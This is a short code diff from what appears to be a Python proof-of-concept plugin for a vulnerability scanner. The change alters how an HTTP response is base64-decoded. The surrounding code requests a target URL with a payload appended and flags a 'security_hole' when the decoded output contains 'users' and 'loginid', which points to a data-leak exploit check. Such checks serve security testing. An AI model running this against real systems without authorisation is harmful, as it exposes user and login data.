@@ -52,7 +52,7 @@ class Poc(ABPoc):
             target = self.target + payload
             #code, head, res, errcode, _ = hh.http(target)
             r = requests.get(target)
-            result = base64.b64decode(r.content)[0:100]
+            result = base64.b64decode(r.text)[0:100]
 
             if r.status_code == 200 and 'users' in result and 'loginid' in result:
                 # security_hole(url)
